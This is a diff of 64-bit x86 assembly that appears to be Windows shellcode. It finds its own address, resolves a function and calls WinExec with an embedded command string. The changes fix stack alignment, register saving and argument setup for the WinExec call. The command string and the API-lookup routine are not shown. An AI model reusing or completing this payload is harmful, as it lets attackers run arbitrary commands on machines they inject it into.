@@ -1,17 +1,13 @@
-[BITS 64]
 [ORG 0]
+[BITS 64]
 
 entry:
-  ; calculate entry address
+  ; store context
   push rbx                      ; store rbx
-  push rdi                      ; store rdi
+
+  ; calculate entry address
   call calc_entry_addr          ; calculate the entry address
   flag_CEA:                     ; flag for calculate entry address
-
-  ; ensure stack is 16 bytes aligned
-  mov rdi, rsp                  ; store current to rdi
-  and rdi, 0xF                  ; calculate the offset
-  sub rsp, rdi                  ; adjust current stack
 
   ; clear the direction flag
   cld
@@ -23,18 +19,26 @@ entry:
   cmp rax, 0                    ; check target function is found
   jz not_found                  ;
 
+  ; ensure stack is 16 bytes aligned
+  push rdi                      ; store rdi
+  mov rdi, rsp                  ; store current to rdi
+  and rdi, 0xF                  ; calculate the offset
+  sub rsp, rdi                  ; adjust current stack
+
   ; call WinExec
+  xor rdx, rdx                  ; clear rdx
   lea rcx, [rbx+command]        ; lpCmdLine
-  movzx dl, [rbx+cmd_show]      ; uCmdShow
+  mov dl, [rbx+cmd_show]        ; uCmdShow
   sub rsp, 32                   ; reserve stack
   call rax                      ; call api function
   add rsp, 32                   ; restore stack
 
   ; restore aligned stack
   add rsp, rdi                  ; restore stack from rdi
+  pop rdi                       ; restore rdi
 
   not_found:                    ;
-  pop rdi                       ; restore rdi
+  ; restore context
   pop rbx                       ; restore rbx
   ret                           ; return to the caller
 
